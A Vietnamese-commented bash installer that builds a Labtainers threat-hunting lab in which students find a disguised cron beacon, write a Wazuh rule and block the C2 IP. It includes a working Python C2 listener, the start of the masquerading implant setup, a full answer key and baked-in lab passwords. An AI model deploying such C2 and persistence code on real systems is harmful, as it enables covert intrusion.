#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-threathunt (Reverse shell + Threat Hunting) tren VM Labtainers.
# Chay tren VM:  bash install-soc-threathunt.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-threathunt
# (siem = anh chung soc-wazuh (Wazuh cai san) -> rebuild NHANH, khong tai/cai Wazuh.
#  Can co san image localhost:5000/soc-wazuh trong registry VM - da dung tu Chang 0/webshell.)
# (File nay duoc SINH TU DONG tu thu muc nguon - khong sua tay.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-threathunt
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong C2 listener ngam,
# tach hoan toan khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid python3 /home/ubuntu/listen.py >/home/ubuntu/c2.log 2>&1 < /dev/null &
exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/listen.py" <<'__EOF_TH_7k2m__'
#!/usr/bin/env python3
# C2 listener: nghe cong C2PORT, GHI LOG moi ket noi reverse shell goi ve,
# va GIU ket noi mo (de phia phong thu thay ket noi ESTABLISHED khi dieu tra).
import socket
import threading
import time

HOST = "0.0.0.0"
PORT = C2PORT  # ca nhan hoa qua RAND_REPLACE

def handle(conn, addr):
    print(time.strftime("%Y-%m-%d %H:%M:%S"), "CONNECT from", addr, flush=True)
    try:
        conn.sendall(b"id\n")          # gui 1 lenh (mo phong C2 ra lenh)
        while True:
            data = conn.recv(4096)     # giu ket noi, doc output shell
            if not data:
                break
    except Exception:
        pass
    finally:
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "DISCONNECT", addr, flush=True)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(5)
print(time.strftime("%Y-%m-%d %H:%M:%S"), "C2 listening on", PORT, flush=True)

while True:
    try:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except Exception:
        time.sleep(1)
__EOF_TH_7k2m__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_TH_7k2m__'
SOC Lab - Threat Hunting: San -> Phat hien -> Ung pho.
May target bi cai implant C2 nguy trang (beacon ve may tan cong), lan giua cac ket noi lanh tinh.
Nhiem vu 3 pha: (1) SAN ra cai doc giua nhieu + ghi phieu San 5 cau (~/dieu-tra.txt: IP/tien trinh
nguy trang/persistence/field phan biet/cong ca nhan hoa); (2) PHAT HIEN - tu viet luat Wazuh bat
beacon; (3) UNG PHO phau thuat - chan dung IP C2 ma khong lam dut dich vu giam sat lanh tinh (SLA).
__EOF_TH_7k2m__
cat > "$LAB/config/parameter.config" <<'__EOF_TH_7k2m__'
# parameter.config - ca nhan hoa (chong chep bai)
# Moi sinh vien co CONG C2 khac nhau -> ket noi reverse shell toi 172.20.0.5:<cong khac nhau>.
# Token C2PORT thay bang so ngau nhien trong CA target (script doc) LAN attacker (listener)
# => dung mot gia tri cho ca hai. Grading van tinh (match 172.20.0.5:<bat ky cong nao>).
C2PORT : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:listen.py : C2PORT : 20000 : 65000
__EOF_TH_7k2m__
cat > "$LAB/config/start.config" <<'__EOF_TH_7k2m__'
# start.config - Lab soc-threathunt v2 (Threat Hunting: San -> Phat hien -> Ung pho)
# target bi cai implant C2 nguy trang (beacon ve attacker). SV: SAN giua nhieu -> VIET LUAT Wazuh
# bat beacon -> CHAN C2 phau thuat (khong lam dut giam sat lanh tinh).

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-threathunt_student_master_seed
	GRADE_CONTAINER target

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: bi nhiem san, noi sinh vien dieu tra + go bo ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: C2 listener, chay ngam (TERMINALS 0 = "hidden") ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, co Firefox de xem dashboard Wazuh ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_TH_7k2m__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Mo Wazuh dashboard trong Firefox tren tram defender.
# LUU Y: file nay duoc SOURCE vao shell dang nhap -> TUYET DOI khong goi 'exit' (tat terminal)
# va khong chay vong lap/sleep o foreground (treo terminal). Toan bo bon vao MOT SUBSHELL NEN ( ) &.
#
# CHONG LOI "firefox khong len / cannot open display": tu tao MOT FILE symlink
# /tmp/.X11-unix/X<n> -> /var/tmp/.X11-unix/X<n> (CHI tao FILE symlink khi THIEU, TUYET DOI
# khong bien ca thu muc /tmp/.X11-unix thanh symlink -> tranh loi doX11Link "same file").
if ! id | grep -q 'uid=0'; then
  (
    export DISPLAY="${DISPLAY:-:0}"
    dn="${DISPLAY#:}"; dn="${dn%%.*}"
    ensure_x11() {
      [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 2>/dev/null
      if [ ! -S "/tmp/.X11-unix/X$dn" ] && [ -S "/var/tmp/.X11-unix/X$dn" ]; then
        ln -sf "/var/tmp/.X11-unix/X$dn" "/tmp/.X11-unix/X$dn" 2>/dev/null
      fi
    }
    for _ in $(seq 1 20); do
      ensure_x11
      [ -S "/tmp/.X11-unix/X$dn" ] && break
      sleep 2
    done
    ensure_x11
    ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
  ) >/dev/null 2>&1 &
fi
__EOF_TH_7k2m__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.attacker.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - attacker (C2 listener, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# python3 de chay C2 listener (socket trong thu vien chuan, khong can pip)
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.defender.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.siem.student" <<'__EOF_TH_7k2m__'
#
# siem - dung image nen soc-wazuh (Wazuh cai san). Entrypoint khoi phuc quyen Wazuh truoc init.
# (Da BAKE san anh chung vao nguon - KHONG can chay apply-shared-siem.sh nua. Giong Chang 0 + webshell.)
#
ARG registry
FROM localhost:5000/soc-wazuh:latest
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem detection)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# === Entrypoint: khoi phuc quyen cac user Wazuh (bi reset ve root khi layer image chung).
#     Chay o PID 1 TRUOC systemd -> OpenSearch chua chay -> chown /var/lib an toan (khong hong node.lock),
#     roi exec /sbin/init -> systemd khoi dong day du indexer + manager + dashboard + filebeat. ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  '# Khoi phuc quyen cac user Wazuh truoc khi systemd start cac service.' \
  'for u in wazuh-indexer wazuh-dashboard; do' \
  '  id "$u" >/dev/null 2>&1 || continue' \
  '  chown -R "$u:$u" /usr/share/$u /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
  'done' \
  '# filebeat + wazuh-manager chay root -> khong can chown' \
  '# Don trang thai agent cu tu anh nen (counter rids + client.keys) -> agent enroll lai sach,' \
  '# tranh loi "counter mismatch" lam agent Disconnected khi dung image chung.' \
  'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
  'exec /sbin/init --log-target=journal 3>&1' \
  > /entrypoint.sh && chmod +x /entrypoint.sh
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
# Ghi DUNG ten lab cho siem: anh nen soc-wazuh mang san .labname cua lab goc.
# Neu khong ghi de, zip artifact cua siem bi dat ten theo lab SAI -> grader lech firstlevelzip
# -> loi "Error occurred within the grader container" khi checkwork.
RUN mkdir -p /home/$user_name/.local && echo "soc-threathunt" > /home/$user_name/.local/.labname \
    && chown $user_name:$user_name /home/$user_name/.local/.labname 2>/dev/null || true
CMD ["/entrypoint.sh"]
__EOF_TH_7k2m__
cat > "$LAB/dockerfiles/Dockerfile.soc-threathunt.target.student" <<'__EOF_TH_7k2m__'
#
# Labtainer Dockerfile - target (bi nhiem san reverse shell + Wazuh agent)
#
ARG registry
# Base co san openssh-server (sshd) + rsyslog -> giu de analyst SSH sang
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cho prestop/analyst chay sudo khong mat khau mot so lenh dieu tra
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/crontab, /bin/crontab, /usr/bin/cat, /bin/cat, /usr/sbin/ss, /sbin/ss, /bin/ss, /usr/bin/stat, /bin/stat, /sbin/iptables, /usr/sbin/iptables' > /etc/sudoers.d/labtainer-hunt \
    && chmod 440 /etc/sudoers.d/labtainer-hunt
#
# cron (persistence) + iproute2 (ss) cho dieu tra + iptables (ung pho chan C2)
RUN apt-get update && apt-get install -y --no-install-recommends cron iproute2 iptables \
    && rm -rf /var/lib/apt/lists/* || true
#
# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
RUN systemctl enable cron 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_TH_7k2m__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_TH_7k2m__'
================================================================================
 SOC LAB: THREAT HUNTING - SAN -> PHAT HIEN -> UNG PHO (Wazuh SIEM)
================================================================================

1. TONG QUAN (OVERVIEW)
--------------------------------------------------------------------------------
May 'target' da bi cai mot IMPLANT C2 chay ngam: dinh ky "goi ve" may tan cong
(C2, 172.20.0.5) qua mot cong LA, tien trinh duoc NGUY TRANG cho giong tien trinh he thong.
Quanh no con co cac ket noi/tien trinh LANH TINH (nhieu). Ban KHONG duoc cho biet truoc IOC -
phai TU SAN ra giua dong nhieu. Day la 3 ky nang SOC noi tiep nhau:
  (1) SAN (hunting) - tu tim ra cai doc; (2) PHAT HIEN (detection engineering) - tu viet luat
  Wazuh de he thong tu canh bao; (3) UNG PHO - cat dut C2 mot cach CHINH XAC, khong lam hong
  dich vu lanh tinh.

*** Lan dau doi siem khoi dong Wazuh (~1-2' - anh chung da cai san). ***

2. MUC TIEU HOC TAP (OBJECTIVES)
--------------------------------------------------------------------------------
  - Phan biet hoat dong DOC voi LANH TINH dua tren hanh vi (beacon dinh ky, dich/cong la,
    tien trinh nguy trang) - khong chi "thay ket noi ra ngoai la chan".
  - Tu viet luat phat hien (Wazuh custom rule) + kiem thu bang wazuh-logtest.
  - Ung pho PHAU THUAT: chan dung cai doc ma khong lam gian doan giam sat/dich vu that.

3. KIEN THUC NEN (BACKGROUND)
--------------------------------------------------------------------------------
* Reverse shell / C2 beacon: may nan nhan CHU DONG ket noi ra may ke tan cong theo chu ky
  ("beacon"), tao kenh dieu khien. Dau hieu san: ket noi ra mot host/cong bat thuong, lap lai
  deu dan; tien trinh dang ngo (ten gia danh tien trinh he thong nhung lai co ket noi mang).
* Nguy trang (masquerading): malware thuong dat ten giong tien trinh that (vd '[kworker/...]',
  'sysmon', 'update'...). Tien trinh nhan kernel that KHONG co ket noi mang - do la cach phan biet.
* Wazuh custom rule: them luat vao /var/ossec/etc/rules/local_rules.xml tren SIEM (id >= 100000),
  dung <match>/<regex>/<program_name> de khop dong log; test bang `wazuh-logtest` (dan 1 dong log
  vao, xem luat co khop + level); nap luat bang `systemctl restart wazuh-manager`.
* MITRE ATT&CK lien quan: T1053 (Scheduled Task/cron - persistence), T1059 (Command/Shell),
  T1071 (Application Layer Protocol - C2). Dashboard Wazuh co module MITRE de doi chieu.
* Ung pho phau thuat: chan DUNG IP C2 (tuong lua theo -d <ip>) thay vi "drop het egress" (se cat
  luon ket noi Wazuh agent -> mu giam sat). Cat mau dung cho, giu dich vu that song.

4. MOI TRUONG & SO DO (TOPOLOGY)
--------------------------------------------------------------------------------
  attacker (172.20.0.5, AN)  -- C2 listener (noi implant goi ve)
  target   (172.20.0.10)     -- may nhiem; co Wazuh agent + log giam sat /var/log/netmon.log
  siem     (172.20.0.20)     -- Wazuh (dashboard https://172.20.0.20) + noi ban VIET LUAT
  defender (172.20.0.30)     -- tram cua ban: Firefox + SSH
  Dang nhap dashboard SIEM:  https://172.20.0.20   admin / Q*uJjovx2guqFRqntC568k?lf3evm.jl
     (mat khau admin CO DINH baked trong anh chung soc-wazuh - giong Bai 1-3/7.)
  Dang nhap target de dieu tra:  ssh analyst@target   (mat khau: analyst)

5. NHIEM VU (TASKS)
--------------------------------------------------------------------------------
--- PHA 1: SAN (tim ra cai doc giua nhieu) -> GHI PHIEU ~/dieu-tra.txt ---
  File khung ~/dieu-tra.txt DA CO SAN tren target (H1=..H5= de trong). SSH sang dien SO:
     ssh analyst@target   ->   nano ~/dieu-tra.txt
  5 cau can tra loi (ghi SO sau moi dau '='):
     H1. Octet cuoi IP C2?                          (172.20.0.X -> ghi X)
     H2. Tien trinh NGUY TRANG giu ket noi C2?      1 sshd  2 [kworker/0:2]  3 systemd  4 cron
     H3. Co che DUY TRI (persistence) cua implant?  1 /etc/crontab  2 /etc/cron.d/sysmon  3 ~/.bashrc  4 /etc/rc.local
     H4. Field trong netmon.log phan biet DOC/LANH? 1 proc=monitor  2 proc=kworker-helper  3 dport  4 hostname
     H5. Cong C2 (ca nhan hoa - tu san)?

  GOI Y 3 CAP:
   Cap 1 (huong di):
     - Dashboard Wazuh FIM: tab INVENTORY = anh chup file DANG duoc giam sat (thay implant trong
       /etc/cron.d, /usr/local/bin - ca khi no cai TRUOC luc bat FIM). Tab EVENTS = thay doi theo
       thoi gian (chu yeu /tmp doi moi phut). Security events cho thay dong 'netmon: conn' ra dich la.
       (Luu y: file cai TRUOC khi agent canh FIM nam trong baseline -> KHONG bao 'added' o Events,
        nhung VAN hien o Inventory. Events=su kien theo thoi gian; Inventory=trang thai hien tai.)
     - Tren target: liet ke socket kem tien trinh so huu; chu y tien trinh ten giong he thong
       nhung LAI co ket noi mang (tien trinh kernel THAT khong co ket noi mang).
   Cap 2 (lenh cu the, tren ssh analyst@target):
     - Ket noi C2 + PID:      sudo ss -tnp | grep 172.20.0.5   (lay PID giu ket noi + cong C2)
     - Ten nguy trang (H2):   ps -p <PID> -o pid,comm,args
       (ss/comm hien 'bash'; nhung argv[0] bi gia thanh [kworker/0:2] - exec -a chi doi argv[0].
        Kernel thread [kworker/...] THAT khong bao gio co ket noi mang -> day la cach phat hien.)
     - Log beacon:            grep 'dst=172.20.0.5' /var/log/netmon.log | tail
       (so sanh dong DOC voi dong LANH TINH - chung khac nhau o field 'proc=')
     - Persistence:           cat /etc/cron.d/sysmon        (cron nao chay implant moi phut)
     - Cong C2 (H5):          so sau 'dport=' trong CHINH dong beacon dst=172.20.0.5
   Cap 3 (dap an huong dan):
     H1=5. H2=2 ([kworker/0:2]). H3=2 (/etc/cron.d/sysmon). H4=2 (proc=kworker-helper). H5=<cong tu san>.

--- PHA 2: PHAT HIEN (tu viet luat Wazuh) ---
  Wazuh chi ghi ALERT khi co RULE khop. Chua rule nao biet dong 'netmon: conn' -> phai TU viet.
  Tren SIEM (ssh/terminal siem), sua /var/ossec/etc/rules/local_rules.xml, THEM mot luat (id >= 100000)
  khop dong log beacon toi C2 va dat level canh bao. Khung vi du (tu dien IP C2 BAN da tim):
      <group name="local,threat_hunt,">
        <rule id="100200" level="12">
          <match>conn dst=&lt;IP_C2_BAN_TIM&gt;</match>
          <description>C2 beacon detected</description>
          <group>c2_detected,</group>
        </rule>
      </group>
    (Dung 'conn dst=...' - KHONG de 'netmon:' trong <match> vi 'netmon' bi tach lam program_name.
     level 12 = cao (Wazuh chi alert khi level >= 3). id phai >= 100000 = dai rule tu viet.)
  - Kiem thu TRUOC (chua can restart):  sudo /var/ossec/bin/wazuh-logtest
       -> dan 1 dong netmon that (grep 'dst=172.20.0.5' /var/log/netmon.log | tail -1 tren target)
       -> output phai hien  Rule id: '100200'  +  Level: 12. Sai thi sua <match> roi test lai.
  - Nap luat that: `sudo systemctl restart wazuh-manager`  (logtest chi thu, restart moi ap dung).
  - Xac nhan: sau ~1' (beacon ghi moi phut) -> dashboard Security events thay alert; hoac tren siem
       sudo grep 'netmon: conn dst=172.20.0.5' /var/ossec/logs/alerts/alerts.log | tail
  *** Nen lam PHA 2 truoc PHA 3 (dung trinh tu SOC: phat hien -> ung pho). ***

--- PHA 3: UNG PHO PHAU THUAT ---
  - CHAN dung IP C2 o tang mang (goi y: luat tuong lua chan theo dia chi dich la IP C2).
  - KHONG chan bua (vd drop toan bo egress) -> se cat luon ket noi Wazuh agent toi SIEM (172.20.0.20)
    va lam mu giam sat (TRUOT SLA).
  - Kiem chung: luat iptables chan 172.20.0.5 da co (sudo iptables -S | grep 172.20.0.5);
    ket noi toi 172.20.0.20 (SIEM) VAN con. (Luu y: ket noi .5 dang ESTABLISHED co the con hien
    vai phut cho den khi TCP timeout - cham diem theo LUAT chan, khong theo so ket noi.)

6. NOP BAI (SUBMISSION)
--------------------------------------------------------------------------------
  checkwork -> tu kiem tra ; stoplab -> nop bai.
  Cac muc cham (chi cham VIEC BAN LAM):
    - h1..h5         : phieu San ~/dieu-tra.txt (moi cau 1 diem; nham dung toi thieu 4/5).
    - detection_rule : luat Wazuh tu viet NO canh bao tren beacon.
    - contained      : da CHAN IP C2 (172.20.0.5) bang iptables.
    - sla_ok         : dich vu giam sat lanh tinh (ket noi toi SIEM) van song (khong chan bua).
__EOF_TH_7k2m__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_TH_7k2m__'
# goals.config - Threat Hunting v2 (San -> Phat hien -> Ung pho)
# Chi cham VIEC SINH VIEN LAM (bo threat_detected/agent_connected vi chung tu Y khi lab chay).

# PHA 1 - SAN: phieu ~/dieu-tra.txt. H1..H4 trac nghiem co dinh; H5 = cong C2 ca nhan hoa
# (prestop doi chieu voi cong THAT trong netmon.log -> _h5 = H5_OK).
# H1=octet IP C2(5) ; H2=tien trinh nguy trang([kworker/0:2]=2) ; H3=persistence(cron.d/sysmon=2) ;
# H4=field phan biet doc/lanh(proc=kworker-helper=2).
h1 = matchany : integer_equal : _h1 : answer=5
h2 = matchany : integer_equal : _h2 : answer=2
h3 = matchany : integer_equal : _h3 : answer=2
h4 = matchany : integer_equal : _h4 : answer=2
h5 = boolean : _h5

# PHA 2 - PHAT HIEN: luat Wazuh tu viet NO canh bao tren beacon
detection_rule = boolean : _detection
# PHA 3 - UNG PHO: da chan IP C2 (.5) bang iptables
contained      = boolean : ( _marker and _contained )
# PHA 3 (SLA): khong chan bua - dich vu giam sat lanh tinh (.20) van song
sla_ok         = boolean : ( _marker and _sla )
# (Bo 'incident_resolved' - chi la AND lap lai cua cac tieu chi tren, de loi parser boolean.
#  Bo 'hunt_dieutra' (count_greater gop) - cham tung cau H1..H5 cho minh bach.
#  Dat bai = H1..H5 (nham >=4/5) + detection_rule + contained + sla_ok.)
__EOF_TH_7k2m__
cat > "$LAB/instr_config/results.config" <<'__EOF_TH_7k2m__'
# results.config - Threat Hunting v2 (San -> Phat hien -> Ung pho)
# Chi cham VIEC SINH VIEN LAM; prestop chi in co/OK, khong lo IOC.

# --- target ---
_marker    = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Containment: da chan IP C2 (.5) bang iptables chua?
_contained = target:prestop.stdout : FILE_REGEX : CONTAINED
# SLA: ket noi lanh tinh toi SIEM (.20) con song?
_sla       = target:prestop.stdout : FILE_REGEX : SLA_OK
# Phieu San: H1..H4 (dap an co dinh, cham o goals.config) + H5 (cong ca nhan hoa, prestop doi chieu)
_h1  = target:prestop.stdout : GROUP : 1 : REGEX : H1\s*=\s*([0-9]+)
_h2  = target:prestop.stdout : GROUP : 1 : REGEX : H2\s*=\s*([0-9]+)
_h3  = target:prestop.stdout : GROUP : 1 : REGEX : H3\s*=\s*([0-9]+)
_h4  = target:prestop.stdout : GROUP : 1 : REGEX : H4\s*=\s*([0-9]+)
_h5  = target:prestop.stdout : FILE_REGEX : H5_OK

# --- siem: luat phat hien cua SV co no canh bao tren beacon khong? ---
_detection = siem:prestop.stdout : FILE_REGEX : DETECTION_OK

# --- Goi y checkwork ---
#CHECK_TRUE: Chua CHAN C2 - hay chan DUNG IP C2 (iptables ... -d 172.20.0.5 -j DROP). Ket noi ESTABLISHED con dinh se tu timeout.
cw_contained = target:prestop.stdout : FILE_REGEX : CONTAINED
#CHECK_TRUE: Ket noi lanh tinh toi SIEM (172.20.0.20) phai CON - dung chan bua (drop het egress) lam dut giam sat.
cw_sla = target:prestop.stdout : FILE_REGEX : SLA_OK
#CHECK_TRUE: Chua viet duoc luat Wazuh bat beacon. Them rule vao local_rules.xml (id>=100000) match 'netmon: conn dst=172.20.0.5', test wazuh-logtest, restart wazuh-manager.
cw_det = siem:prestop.stdout : FILE_REGEX : DETECTION_OK
#CHECK_TRUE: Chua dien dung phieu San ~/dieu-tra.txt (H1..H5). H5 phai la DUNG cong C2 ca nhan hoa (san trong netmon.log/ss).
cw_rep = target:prestop.stdout : FILE_REGEX : H5_OK
__EOF_TH_7k2m__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# soc-wazuh da cai san Wazuh. Quyen cac user Wazuh duoc khoi phuc o /entrypoint.sh (PID 1, TRUOC systemd),
# nen o day KHONG chown gi (chown /var/lib luc dang chay se hong node.lock cua OpenSearch).
# systemd tu khoi dong indexer/manager/filebeat/dashboard luc boot. (Da bake anh chung -> khong goi wazuh-setup.)
exit 0
__EOF_TH_7k2m__
cat > "$LAB/siem/_bin/prestop" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay luc checkwork/stoplab tren siem. Cham PHA 2 (detection engineering):
# Wazuh chi ghi ALERT khi co RULE khop. Khong built-in rule nao biet toi /var/log/netmon.log,
# nen neu alerts.log co dong 'netmon: conn dst=172.20.0.5' => chac chan LUAT CUA SV da no.
# Chi in co/OK, khong dump IOC.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_SIEM"
sudo -n grep -aE 'netmon: conn dst=172\.20\.0\.5' /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -q . && echo "DETECTION_OK"

exit 0
__EOF_TH_7k2m__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chay LAN DAU tren target, quyen 'ubuntu'. $1 = mat khau sudo.
# Gieo implant C2 nguy trang + log giam sat ket noi (/var/log/netmon.log) cho detection engineering.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }

# ===== 1) Implant beacon (nguy trang 'sysmon') - cron moi phut =====
cat > /tmp/.sysmon <<'SH'
#!/bin/bash
# "sysmon" - thuc chat la beacon C2 nguy trang (persistence). Cron chay moi phut.
exec 2>/dev/null
# (a) LUON ghi su kien beacon vao log giam sat (cho detection) - moi lan chay, doc lap ket noi
